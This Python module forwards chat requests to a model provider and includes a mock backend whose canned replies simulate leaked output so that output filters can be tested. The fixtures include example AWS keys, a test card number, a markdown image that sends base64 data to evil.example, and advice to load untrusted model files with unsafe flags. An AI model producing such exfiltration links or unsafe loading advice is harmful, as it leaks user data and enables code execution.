"""Forwarding to the real model provider, or a mock for demos and tests."""

from __future__ import annotations

import os
import time
from dataclasses import dataclass

import httpx

from ..config import Upstream


@dataclass
class Completion:
    content: str
    input_tokens: int
    output_tokens: int
    compute_seconds: float
    raw: dict


# Mock replies keyed by a trigger word in the last user message, so output controls can be exercised.
MOCK_REPLIES = {
    "leak-key": "Sure, the deploy key is AKIAIOSFODNN7EXAMPLE and the backup key is AKIAI44QH8DHBEXAMPLE.",
    "leak-card": "The customer's card on file is 4111 1111 1111 1111, expiring 12/29.",
    "leak-salary": "CONFIDENTIAL - internal only: the unreleased Q4 salary bands for engineering are attached.",
    "leak-image": "Here is your summary ![chart](https://evil.example/log?data=c2VjcmV0cw==)",
    "leak-code": "Load it with torch.load('model.bin', weights_only=False) and trust_remote_code=True.",
}


class UpstreamClient:
    def __init__(self, cfg: Upstream, client: httpx.AsyncClient | None = None):
        self.cfg = cfg
        self.client = client or httpx.AsyncClient(timeout=120)

    async def chat(self, body: dict) -> Completion:
        t0 = time.perf_counter()
        if self.cfg.backend == "mock":
            return self._mock(body, t0)
        url = self.cfg.url.rstrip("/") + "/v1/chat/completions"
        if self.cfg.backend == "openai":
            url = self.cfg.url.rstrip("/") + "/chat/completions"
        headers = {}
        if self.cfg.api_key_env:
            headers["Authorization"] = f"Bearer {os.environ.get(self.cfg.api_key_env, '')}"
        r = await self.client.post(url, json={**body, "stream": False}, headers=headers)
        r.raise_for_status()
        data = r.json()
        usage = data.get("usage") or {}
        return Completion(
            content=data["choices"][0]["message"].get("content") or "",
            input_tokens=usage.get("prompt_tokens", 0),
            output_tokens=usage.get("completion_tokens", 0),
            compute_seconds=time.perf_counter() - t0,
            raw=data,
        )

    def _mock(self, body: dict, t0: float) -> Completion:
        last = next((m for m in reversed(body.get("messages", [])) if m.get("role") == "user"), {})
        prompt = str(last.get("content", ""))
        reply = next((v for k, v in MOCK_REPLIES.items() if k in prompt), None)
        if reply is None:
            reply = f"(mock {body.get('model')}) You asked about: {prompt[:120]}"
        prompt_tokens = sum(len(str(m.get("content", ""))) for m in body.get("messages", [])) // 4
        return Completion(reply, prompt_tokens, len(reply) // 4, time.perf_counter() - t0, {})
